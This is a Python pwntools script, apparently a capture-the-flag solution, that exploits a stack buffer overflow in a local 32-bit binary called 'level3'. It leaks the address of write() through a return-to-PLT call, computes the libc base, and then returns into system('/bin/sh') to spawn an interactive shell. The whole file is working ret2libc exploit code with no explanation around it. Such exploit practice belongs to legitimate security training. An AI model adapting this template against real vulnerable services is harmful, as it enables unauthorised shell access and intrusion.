from pwn import *

io = process("./level3")

elf = ELF("./level3")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

payload = cyclic(0x88 + 4) + p32(elf.plt["write"]) + p32(elf.symbols["vulnerable_function"]) + p32(1) + p32(elf.got["write"]) + p32(4)

io.recv()
io.send(payload)
temp = io.recv(4)
write_addr = u32(temp)
libc_base = write_addr - libc.symbols["write"]
system_addr = libc_base + libc.symbols["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh"))

payload2 = cyclic(0x88 + 4) + p32(system_addr) + b'AAAA' + p32(bin_sh)

io.recv()
io.send(payload2)
io.interactive()
